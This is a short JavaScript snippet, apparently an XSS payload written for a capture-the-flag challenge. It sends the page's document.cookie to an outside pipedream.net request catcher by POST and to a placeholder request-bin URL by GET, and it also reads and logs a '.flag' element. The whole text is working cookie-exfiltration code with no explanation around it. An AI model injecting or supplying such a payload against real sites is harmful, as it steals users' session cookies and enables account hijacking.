const url = "http://eoj7lmn4p7wgsgc.m.pipedream.net";
const req = new XMLHttpRequest();
req.open("POST", url, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(`cookie=${document.cookie}`);

const flag = document.querySelector('.flag').innerText;
console.log(`The flag is: ${flag}`);

const xhr = new XMLHttpRequest();
xhr.open('GET', 'http://your-request-bin-url.com/?data=' + document.cookie);
xhr.send();
